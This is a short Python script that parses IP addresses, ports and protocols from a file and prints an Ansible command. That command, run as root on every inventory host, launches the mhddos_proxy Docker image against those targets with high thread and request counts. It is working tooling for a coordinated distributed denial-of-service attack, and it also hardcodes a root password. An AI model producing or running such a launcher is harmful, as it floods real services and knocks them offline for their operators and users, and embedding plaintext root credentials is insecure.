import re

###templates for file
templ_ansible_begin = "ansible all -i hosts -m shell -a \""
templ_begin = "docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "
templ_end = " -t 1000 -p 1200 --rpc 1000  --debug"
templ_ansible_end = "\"--extra-vars \"ansible_user=root ansible_password=@Ubuntu123a\" "

file1 = open('raw_file_test', 'r')
Lines = file1.readlines()

###start file
print(templ_ansible_begin, end=" ")
print(templ_begin, end=" ")

###for line in Lines1:
for line in Lines:
      result = re.findall("[0-9]+.[0-9]+.[0-9]+.[0-9]+|[0-9]+|tcp|udp", line.strip())
      if len(result) > 1:
         #print(result)

         r = 1 
         while r < len(result):
            #print (r, len(result))
      
            print (result[r+1]+"://"+result[0]+":"+result[r], end=" ")
            r += 2

file1.close()

###end file
print (templ_end, end=" ")
print(templ_ansible_end, end=" ")